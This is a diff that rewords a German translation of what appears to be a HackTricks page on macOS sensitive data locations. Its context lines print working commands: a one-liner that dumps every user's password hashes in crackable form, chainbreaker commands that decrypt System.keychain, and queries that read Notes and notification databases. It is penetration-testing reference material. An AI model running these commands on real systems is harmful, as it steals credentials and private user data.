@@ -17,7 +17,7 @@ Eine alternative Einzeiler, die die Anmeldeinformationen aller Nicht-Dienstkonte
 ```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
-Eine weitere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, besteht darin, `dscl` zu verwenden: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
+Eine weitere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, ist die Verwendung von `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
 
 ### /etc/master.passwd
 
@@ -81,7 +81,7 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 ## Use the previous key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) Hash knacken**
+#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) durch Knacken des Hashes**
 ```bash
 # Get the keychain hash
 python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
@@ -129,7 +129,7 @@ sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 
 Sie finden die Benachrichtigungsdaten in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
 
-Die meisten interessanten Informationen befinden sich in **blob**. Sie müssen also diesen Inhalt **extrahieren** und in **menschlich** **lesbare** Form **transformieren** oder **`strings`** verwenden. Um darauf zuzugreifen, können Sie Folgendes tun:
+Die meisten interessanten Informationen werden in **blob** zu finden sein. Sie müssen also diesen Inhalt **extrahieren** und ihn in **menschlich** **lesbare** Form **transformieren** oder **`strings`** verwenden. Um darauf zuzugreifen, können Sie Folgendes tun:
 ```bash
 cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
 strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
@@ -143,13 +143,13 @@ sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tabl
 #To dump it in a readable format:
 for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
 ```
-## Präferenzen
+## Einstellungen
 
-In macOS-Apps befinden sich die Präferenzen in **`$HOME/Library/Preferences`** und in iOS sind sie in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
+In macOS-Apps befinden sich die Einstellungen in **`$HOME/Library/Preferences`** und in iOS sind sie in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
 
-In macOS kann das CLI-Tool **`defaults`** verwendet werden, um **die Präferenzdatei zu ändern**.
+In macOS kann das CLI-Tool **`defaults`** verwendet werden, um **die Einstellungsdatei zu ändern**.
 
-**`/usr/sbin/cfprefsd`** beansprucht die XPC-Dienste `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Präferenzen durchzuführen.
+**`/usr/sbin/cfprefsd`** beansprucht die XPC-Dienste `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Einstellungen durchzuführen.
 
 ## OpenDirectory permissions.plist
 
@@ -191,7 +191,7 @@ Diese Datei gewährt bestimmten Benutzern Berechtigungen anhand der UUID (und ni
 
 ### Darwin-Benachrichtigungen
 
-Der Hauptdaemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den Mach-Port `com.apple.system.notification_center` registrieren (überprüfen Sie sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon ist mit der Datei `/etc/notify.conf` konfigurierbar.
+Der Hauptdaemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den `com.apple.system.notification_center` Mach-Port registrieren (überprüfen Sie sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon ist konfigurierbar mit der Datei `/etc/notify.conf`.
 
 Die für Benachrichtigungen verwendeten Namen sind eindeutige umgekehrte DNS-Notationen, und wenn eine Benachrichtigung an einen von ihnen gesendet wird, erhalten die Client(s), die angegeben haben, dass sie damit umgehen können, diese.
 
@@ -213,7 +213,7 @@ common: com.apple.security.octagon.joined-with-bottle
 ```
 ### Distributed Notification Center
 
-Das **Distributed Notification Center**, dessen Hauptbinary **`/usr/sbin/distnoted`** ist, ist ein weiterer Weg, um Benachrichtigungen zu senden. Es stellt einige XPC-Dienste zur Verfügung und führt einige Überprüfungen durch, um zu versuchen, Clients zu verifizieren.
+Das **Distributed Notification Center**, dessen Hauptbinary **`/usr/sbin/distnoted`** ist, ist eine weitere Möglichkeit, Benachrichtigungen zu senden. Es stellt einige XPC-Dienste zur Verfügung und führt einige Überprüfungen durch, um zu versuchen, Clients zu verifizieren.
 
 ### Apple Push Notifications (APN)
 
@@ -235,7 +235,7 @@ Es ist auch möglich, Informationen über den Daemon und die Verbindungen mit fo
 Dies sind Benachrichtigungen, die der Benutzer auf dem Bildschirm sehen sollte:
 
 - **`CFUserNotification`**: Diese API bietet eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
-- **Das schwarze Brett**: Dies zeigt in iOS ein Banner an, das verschwindet und im Benachrichtigungszentrum gespeichert wird.
-- **`NSUserNotificationCenter`**: Dies ist das iOS schwarze Brett in MacOS. Die Datenbank mit den Benachrichtigungen befindet sich in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
+- **Das Bulletin Board**: Dies zeigt in iOS ein Banner an, das verschwindet und im Benachrichtigungszentrum gespeichert wird.
+- **`NSUserNotificationCenter`**: Dies ist das iOS-Bulletin-Board in MacOS. Die Datenbank mit den Benachrichtigungen befindet sich in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
 
 {{#include ../../../banners/hacktricks-training.md}}
